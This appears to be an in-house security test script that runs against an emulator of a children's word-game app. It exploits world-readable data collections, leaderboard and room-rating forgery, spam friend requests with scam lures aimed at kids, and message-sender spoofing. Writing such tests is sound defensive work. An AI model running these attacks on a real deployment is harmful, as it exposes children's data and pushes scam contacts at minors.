/* Security & kids-privacy attacks vs the real v1164 pages + real SDK 2.30.0 + repo emulator (READONLY).
 * Proves: (1) roster harvest from world-readable collections; (2) hansen_saves world-read;
 *         (3) leaderboard forgery (self rating + spam name); (4) friend-request flood to strangers;
 *         (5) quick-message sender spoof (bypass fromOpenid check); (6) room ELO/abandon forgery.
 * Run: cd here && HANSEN_PLAYWRIGHT_MODULE=/opt/node22/lib/node_modules/playwright/index.mjs node atk_privacy.mjs
 */
import * as H from '/home/user/wordminiprogram/cloudbase_e2e_harness.mjs';
const j = (x) => JSON.stringify(x);
const READY = () => !!(window.HansenAuth && window.HansenFriends && window.HansenFriendsUI && window.HansenLadderBoard && window.HansenPkRoom && window.HansenSbProfile);
const srv = await H.startStatic();
const browser = await H.launchBrowser();
try {
  const emu = H.makeEmulator({ knobs: { permissionMode: 'legacy', latencyMs: 20, jitterMs: 20 } });
  ['alice', 'bob', 'mallory'].forEach((u) => emu.seedUser({ username: u, password: 'pw123456' }));

  // victims: Alice (cid assigned), Bob
  const A = await H.openPhone(browser, emu, srv.origin, { name: 'A', ready: READY });
  await A.eval(() => window.HansenSbProfile.setName('小爱'));
  const ra = await H.loginPassword(A, 'alice', 'pw123456');
  const aCid = await A.eval(() => (window.HansenSbProfile.readProfile() || {}).cid || 0);
  // give Alice a real cloud save (so hansen_saves has a doc to read)
  await A.eval(async () => { try { window.HansenCloudSave && await window.HansenCloudSave.syncNow && window.HansenCloudSave.syncNow({ force: true }); } catch (e) {} });

  const B = await H.openPhone(browser, emu, srv.origin, { name: 'B', ready: READY });
  await B.eval(() => window.HansenSbProfile.setName('小博'));
  await H.loginPassword(B, 'bob', 'pw123456');
  const bCid = await B.eval(() => (window.HansenSbProfile.readProfile() || {}).cid || 0);

  console.log(`victims: Alice cid=${aCid} uid=${A.cloudUid}  Bob cid=${bCid} uid=${B.cloudUid}`);

  // ── Attacker Mallory: an ordinary logged-in kid with edited JS ──
  const C = await H.openPhone(browser, emu, srv.origin, { name: 'C', ready: READY });
  await C.eval(() => window.HansenSbProfile.setName('路人'));
  await H.loginPassword(C, 'mallory', 'pw123456');

  // (1)+(2) Harvest every world-readable collection
  const harvest = await C.eval(async () => {
    const db = (await window.HansenAuth._app()).database();
    const out = {};
    for (const col of ['sb_profile', 'hansen_friends', 'hansen_friend_msgs', 'hansen_pk_rooms', 'hansen_saves']) {
      try { const r = await db.collection(col).limit(1000).get(); out[col] = (r && r.data) || []; }
      catch (e) { out[col] = 'ERR ' + String(e && e.message || e); }
    }
    return out;
  });
  const prof = harvest.sb_profile || [];
  console.log(`\n[HARVEST] sb_profile docs readable by attacker: ${prof.length}`);
  prof.slice(0, 5).forEach((p) => console.log('   profile:', j({ _id: p._id, uid: p.uid, name: p.name, cid: p.cid, ladderRating: p.ladderRating })));
  const saves = harvest.hansen_saves || [];
  console.log(`[HARVEST] hansen_saves docs readable by attacker: ${saves.length}`);
  saves.slice(0, 2).forEach((s) => console.log('   save:', j({ _id: String(s._id).slice(0, 16) + '…', hasPayload: !!s.payload, iv: s.payload && s.payload.iv, ctLen: s.payload && s.payload.ct && s.payload.ct.length })));

  // (3) Leaderboard forgery: Mallory writes its OWN sb_profile (legal under READONLY) with a fake rating + ad name
  const fe = await C.eval(async () => {
    const db = (await window.HansenAuth._app()).database();
    const uid = (await window.HansenAuth.ensureSession()).uid;
    const r = await db.collection('sb_profile').doc(uid).update({
      ladderRating: 9999, ladderGames: 999, ladderAt: Date.now(), name: '加微信8888领皮肤'
    });
    return { updated: r && (r.updated != null ? r.updated : (r.stats && r.stats.updated)) };
  });
  console.log('\n[FORGE BOARD] Mallory self-update:', j(fe));
  const board = await A.eval(async () => { try { return await window.HansenLadderBoard.fetchTop(); } catch (e) { return { err: String(e && e.message || e) }; } });
  console.log('[FORGE BOARD] Alice sees board top rows:',
    j(((board && board.list) || []).slice(0, 3).map((x) => ({ rank: x.rank, name: x.name, rating: x.rating }))));

  // (4) Friend-request flood: Mallory writes many friend rows targeting Alice, each a different fake owner cid/name
  await C.eval(async (aCid) => {
    const db = (await window.HansenAuth._app()).database();
    const spam = [
      { owner: 90001, friend: aCid, name: '免费领皮肤加QQ123', at: Date.now() },
      { owner: 90002, friend: aCid, name: '老师叫你加我微信', at: Date.now() },
      { owner: 90003, friend: aCid, name: '点我有惊喜', at: Date.now() },
    ];
    for (const s of spam) await db.collection('hansen_friends').add(Object.assign({ kind: 'friend' }, s));
    // also drop a presence row so names resolve / counts look real
  }, aCid);
  const inc = await A.eval(async () => { const r = await window.HansenFriends.listFriends(); return (r.incoming || []).map((x) => ({ cid: x.cid, name: x.name, sub: x.sub })); });
  console.log('\n[FRIEND SPAM] Alice "想加你为好友" list:', j(inc));

  // (5) Quick-message sender spoof: Mallory posts a msg claiming from=Bob (a mutual of Alice), NO fromOpenid
  //     First make Alice<->Bob mutual so onlyFrom lets a Bob-message through.
  await A.eval(async (bCid) => { await window.HansenFriends.addFriend(bCid); }, bCid);
  await B.eval(async (aCid) => { await window.HansenFriends.addFriend(aCid); }, aCid);
  await C.eval(async ([aCid, bCid]) => {
    const db = (await window.HansenAuth._app()).database();
    await db.collection('hansen_friend_msgs').add({
      from: bCid, fromName: '我是你同学·加我QQ', to: aCid, qid: 'pk', at: Date.now(), read: false
      // NOTE: fromOpenid intentionally omitted -> inbox trusted check `!r.fromOpenid` short-circuits to trusted
    });
  }, [aCid, bCid]);
  const ibx = await A.eval(async (bCid) => {
    const r = await window.HansenFriends.inbox({ onlyFrom: [bCid] });
    return (r.msgs || []).map((m) => ({ from: m.from, fromName: m.fromName, text: m.text, suspicious: !!m.suspicious }));
  }, bCid);
  console.log('\n[MSG SPOOF] Alice inbox (onlyFrom=[Bob]):', j(ibx));

  // (6) Room ELO/abandon forgery: Mallory hosts a ladder room claiming a bogus hostRating, then later a guest can
  //     also seed a fake guestRating + fake abandonWin on its own seat. Show host room doc the victim will read.
  const room = await C.eval(async () => {
    const db = (await window.HansenAuth._app()).database();
    const uid = (await window.HansenAuth.ensureSession()).uid;
    const now = Date.now();
    const id = 'rHACK' + now.toString(36);
    await db.collection('hansen_pk_rooms').add({
      _id: id, proto: 2, kind: 'room', status: 'open', isPrivate: false, mode: 'A', askMode: 'cn',
      seed: 1, wordCount: 10, hostId: 'u' + uid, hostName: '新手小白', hostRating: 4000, hostTier: '王者',
      guestId: '', guestName: '', guestRating: 0, seat: 0, createdAt: now, heartbeatAt: now, hostBeat: now,
      hostReady: false, hostReadyAt: 0, hostScore: null, startedAt: 0, endedAt: 0, endedBy: '', abandonWin: ''
    });
    return id;
  });
  const seen = await A.eval(async () => { const r = await window.HansenPkRoom.listRooms(); return (r.rooms || []).map((x) => ({ host: x.hostName, rating: x.hostRating })); });
  console.log('\n[ELO FORGE] Alice lobby sees hosts:', j(seen), '(hostRating used as the opponent ELO the winner gains from)');

  await A.close(); await B.close(); await C.close();
} finally { await browser.close().catch(() => {}); srv.close(); }
